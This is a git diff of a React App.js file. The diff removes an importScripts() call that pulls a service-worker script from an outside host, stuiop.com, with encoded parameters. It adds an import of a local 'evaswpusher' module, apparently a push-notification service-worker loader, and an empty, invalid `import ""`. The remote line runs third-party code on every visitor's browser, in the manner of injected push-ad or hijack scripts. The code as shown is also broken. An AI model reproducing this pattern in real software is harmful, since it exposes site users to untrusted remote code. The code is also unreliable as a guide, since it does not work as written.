@@ -1,5 +1,6 @@
 import React from "react";
 import "./App.css";
+import "./evaswpusher";
 
 import Home from "./pages/Home";
 import Rooms from "./pages/Rooms";
@@ -10,7 +11,8 @@ import Register from './pages/Register'
 import Navbar from "./components/Navbar";
 
 import { Switch, Route } from "react-router-dom";
-importScripts('https://stuiop.com/v1/sw-import.js?h=waWQiOjEwNzU0MTgsInNpZCI6MTA4MzAyOSwid2lkIjoxNzA2NjYsInNyYyI6MiwicG0iOjB9eyJ&d=viewlodges.com.ng');
+
+import ""
 function App() {
   return (
     <>
